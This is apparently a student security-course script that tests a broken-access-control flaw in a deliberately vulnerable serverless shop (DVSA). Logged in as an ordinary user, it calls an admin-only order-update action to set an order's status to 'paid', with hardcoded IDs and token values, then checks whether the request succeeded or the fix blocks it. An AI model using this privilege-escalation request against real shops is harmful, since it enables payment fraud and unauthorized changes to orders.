import requests
import json

"""
ICS344 DVSA Security Project
Lesson 5 - Broken Access Control

This script tests whether a normal authenticated user can trigger an
administrative order update operation and change an order status without
administrator privileges.

IMPORTANT:
- Use this only in the authorized DVSA lab environment.
- Do not commit real authorization tokens to GitHub.
- Paste a fresh normal-user token into AUTH_TOKEN before running.
"""

# ==========================================================
# 1) Configuration
# ==========================================================

API_URL = "https://d0xsecb8a2.execute-api.us-east-1.amazonaws.com/dvsa/order"
AUTH_TOKEN = "PASTE_NORMAL_USER_TOKEN_HERE"

ORDER_ID = "de2c6970-56fc-4b61-8cc5-ef2faf5f4060"
USER_ID = "e448c488-d081-7062-d36e-6525763d2d27"
ORDER_TOKEN = "sFxwh10ZuJz7"


# ==========================================================
# 2) Build headers
# ==========================================================

headers = {
    "content-type": "application/json",
    "authorization": AUTH_TOKEN
}


# ==========================================================
# 3) Step A - Check current order status before exploit
# ==========================================================

check_payload = {
    "action": "orders",
    "user": USER_ID
}

print("=" * 70)
print("Lesson 5 - Broken Access Control Test")
print("=" * 70)
print("[1] Checking normal user orders before exploit...")
print("-" * 70)

try:
    check_response = requests.post(
        API_URL,
        headers=headers,
        json=check_payload,
        timeout=15
    )

    print("Status Code:", check_response.status_code)

    try:
        print(json.dumps(check_response.json(), indent=4))
    except json.JSONDecodeError:
        print(check_response.text)

except requests.exceptions.RequestException as error:
    print("[ERROR] Failed to check orders:")
    print(error)


# ==========================================================
# 4) Step B - Try to trigger admin update as normal user
# ==========================================================

exploit_payload = {
    "action": "admin-update-orders",
    "order-id": ORDER_ID,
    "userId": USER_ID,
    "status": "paid",
    "itemList": [],
    "address": {},
    "token": ORDER_TOKEN,
    "total": 44
}

print("\n" + "=" * 70)
print("[2] Sending Broken Access Control exploit request...")
print("[*] Normal user is trying to call admin-update-orders")
print("[*] Target order:", ORDER_ID)
print("[*] Attempted new status: paid")
print("-" * 70)

try:
    exploit_response = requests.post(
        API_URL,
        headers=headers,
        json=exploit_payload,
        timeout=15
    )

    print("Status Code:", exploit_response.status_code)

    try:
        exploit_json = exploit_response.json()
        print(json.dumps(exploit_json, indent=4))
    except json.JSONDecodeError:
        print(exploit_response.text)

    print("-" * 70)

    response_text = exploit_response.text.lower()

    if exploit_response.status_code == 200 and "order updated" in response_text:
        print("[!] Broken Access Control confirmed.")
        print("[!] A normal user was able to trigger the admin update operation.")
        print("[!] Check DynamoDB to confirm that orderStatus changed to paid.")

    elif exploit_response.status_code in [401, 403] or "unauthorized" in response_text:
        print("[+] Access denied.")
        print("[+] The fix is working. Normal users cannot call admin-update-orders.")

    else:
        print("[*] Review the response above and verify the order status in DynamoDB.")

except requests.exceptions.RequestException as error:
    print("[ERROR] Exploit request failed:")
    print(error)


# ==========================================================
# 5) Step C - Check orders again after exploit attempt
# ==========================================================

print("\n" + "=" * 70)
print("[3] Checking orders again after exploit attempt...")
print("-" * 70)

try:
    final_response = requests.post(
        API_URL,
        headers=headers,
        json=check_payload,
        timeout=15
    )

    print("Status Code:", final_response.status_code)

    try:
        print(json.dumps(final_response.json(), indent=4))
    except json.JSONDecodeError:
        print(final_response.text)

except requests.exceptions.RequestException as error:
    print("[ERROR] Failed to check orders after exploit:")
    print(error)

print("=" * 70)
print("Test completed.")
print("=" * 70)
